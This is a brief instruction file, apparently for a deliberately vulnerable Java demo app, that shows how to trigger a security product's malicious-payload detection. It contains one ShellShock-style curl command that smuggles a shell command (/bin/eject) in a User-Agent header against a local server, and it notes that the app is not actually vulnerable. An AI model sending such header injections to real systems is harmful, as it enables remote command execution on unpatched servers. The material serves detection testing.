# Instructions for exploiting vulnerabilities in the java - goof app

## Exploits

### Malicious Payload (Intrusion Prevention)
Open a terminal window and paste in the following (ShellShock) exploit:
```
curl -H "User-Agent: () { :; }; /bin/eject" http://127.0.0.1:8080
```
Note: The application doesn't actually suffer from the ShellShock vulnerability.  But, Cloud One Application Security's Malicious Payload algorithms will pick up on the attempts.
